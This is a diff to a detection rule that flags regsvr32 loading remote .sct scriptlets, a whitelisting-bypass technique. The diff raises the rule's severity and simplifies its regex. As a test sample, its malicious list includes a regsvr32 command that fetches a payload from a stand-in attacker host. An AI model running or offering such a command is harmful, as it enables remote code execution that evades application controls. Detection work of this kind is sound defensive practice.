@@ -1,5 +1,5 @@
-name: high-16-regsvr32
-severity: high
+name: critical-09-regsvr32
+severity: critical
 description: >
   Detects regsvr32 executing remote scriptlets or DLLs. Application whitelisting bypass technique.
   various flag combinations, URL protocols (HTTP/HTTPS/FTP), and .sct file extensions in any context.
@@ -7,7 +7,7 @@ description: >
   or scriptlets. Also detects local .sct files which may have been dropped by other malware components.
 
 pattern: |
-  (?i)regsvr32(?:\.exe)?[\s\r\n]+(?:[^\r\n]*?(?:/s|/u|/n|/i:)[\s\r\n]+)*[^\r\n]*?(?:/i:(?:http://|https://|ftp://)|scrobj\.dll.*?(?:http://|https://|ftp://)|\.sct)
+  (?i)regsvr32.*(https?://|ftp://.*\.sct|scrobj\.dll.*https?://|\.sct)
 
 malicious:
   - "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
